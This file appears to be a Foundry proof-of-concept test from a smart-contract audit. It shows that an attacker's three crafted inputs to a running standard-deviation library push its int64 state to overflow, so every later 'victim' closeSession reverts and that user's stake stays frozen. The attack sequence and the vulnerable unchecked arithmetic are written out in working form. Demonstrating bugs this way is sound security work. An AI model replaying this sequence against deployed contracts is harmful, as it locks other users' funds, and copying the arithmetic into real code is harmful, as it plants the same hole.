// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {Test} from "forge-std/Test.sol";

library LibSD {
    struct SD { int64 mean; int64 sqSum; }
    function add(SD storage self, int64 x_, int64 updatedCount_) internal {
        int64 oldMean_ = self.mean;
        self.mean = self.mean + (x_ - self.mean) / updatedCount_;
        self.sqSum = self.sqSum + (x_ - self.mean) * (x_ - oldMean_);
    }
}
contract Wrap {
    using LibSD for LibSD.SD;
    LibSD.SD public s;
    function add(int64 x, int64 c) external { s.add(x, c); }
    function get() external view returns (int64, int64) { return (s.mean, s.sqSum); }
}
contract LibSDTest is Test {
    Wrap w;
    function setUp() public { w = new Wrap(); }
    int64 constant XMAX = 2147483647;
    int64 constant IMAX = 9223372036854775807;
    function _try(int64 x, int64 c) internal returns (bool ok) { try w.add(x, c) { ok = true; } catch { ok = false; } }

    function test_clean_brick() public {
        // Attacker's 3 signed-receipt closes (tps values): drive shared sqSum near int64 max AND park mean
        // at an extreme (add(XMAX,1) sets mean=XMAX with zero sqSum change since one factor becomes 0).
        assertTrue(_try(XMAX, 1), "a1");   // mean=XMAX,   sqSum=0
        assertTrue(_try(-XMAX, 2), "a2");  // mean=0,      sqSum~9.223e18
        assertTrue(_try(XMAX, 1), "a3");   // mean=XMAX,   sqSum unchanged (~9.223e18)
        (int64 m, int64 sq) = w.get();
        emit log_named_int("attacker-left mean", m);
        emit log_named_int("attacker-left sqSum", sq);
        emit log_named_int("margin to int64 max", IMAX - sq);

        // Now ANY victim close (any realistic tps) -> product ~ (x - XMAX)^2 ~ 4.4e18 -> overflow -> revert.
        int64[4] memory victimTps = [int64(1000), 50000, 250000, 1]; // tps 1, 50, 250, and 0.001
        for (uint256 i = 0; i < 4; i++) {
            bool ok = _try(victimTps[i], int64(int256(4 + i)));
            emit log_named_int("victim tpsScaled1000", victimTps[i]);
            if (!ok) emit log("   -> REVERTED: closeSession bricked, victim stake FROZEN");
            else emit log("   -> survived");
            assertFalse(ok, "victim should brick");
        }
    }
}
